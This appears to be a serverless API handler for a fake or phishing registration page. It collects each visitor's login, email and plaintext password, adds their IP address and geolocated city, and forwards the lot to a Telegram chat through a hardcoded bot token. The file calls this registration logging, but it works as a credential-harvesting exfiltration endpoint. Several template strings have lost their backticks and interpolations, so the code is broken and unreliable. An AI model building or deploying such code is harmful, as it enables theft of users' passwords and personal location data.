/**
 * POST /api/register - логирование регистрации (NEW REGISTRATION (DB))
 */

const https = require('https');

const BOT_TOKEN = process.env.BOT_TOKEN || '8842189334:AAHGd1814LZ-e13xdsfbuH35v_WF4c5RTa4';
const CHAT_ID = process.env.CHAT_ID || '-1004328186753';

function sendTelegram(text) {
  if (!CHAT_ID) return Promise.resolve();
  const payload = JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true });
  return new Promise((resolve, reject) => {
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: /bot/sendMessage,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      },
      (res) => {
        let d = '';
        res.on('data', (c) => (d += c));
        res.on('end', () => resolve(d));
      }
    );
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function getIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  const real = req.headers['x-real-ip'];
  if (real) return real;
  return req.socket.remoteAddress || 'unknown';
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'POST only' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  if (!body) body = {};

  const ip = getIP(req);
  const city = req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : null;
  const country = req.headers['x-vercel-ip-country'] || null;

  let location = body.location || 'unknown';
  if (city && country) {
    location = ${city}, ;
  } else if (country) {
    location = country;
  } else if (ip && ip !== 'unknown' && !ip.startsWith('127.') && !ip.startsWith('192.168')) {
    try {
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 3000);
      const r = await fetch(http://ip-api.com/json/?fields=city,country, { signal: controller.signal });
      const j = await r.json();
      if (j && j.country) location = ${j.city ? j.city + ', ' : ''};
    } catch {}
  }

  const login = body.login || body.username || 'N/A';
  const email = body.email || 'N/A';
  const pass = body.pass || body.password || 'N/A';

  const text =
    📝 NEW REGISTRATION (DB)\n +
    -------------------\n +
    👤 Login: \n +
    📧 Email: \n +
    🔐 Pass: \n +
    -------------------\n +
    🌍 IP: \n +
    🏳️ Location: ;

  try {
    await sendTelegram(text);
  } catch (e) {
    console.error('telegram error', e);
  }

  return res.status(200).json({ ok: true });
};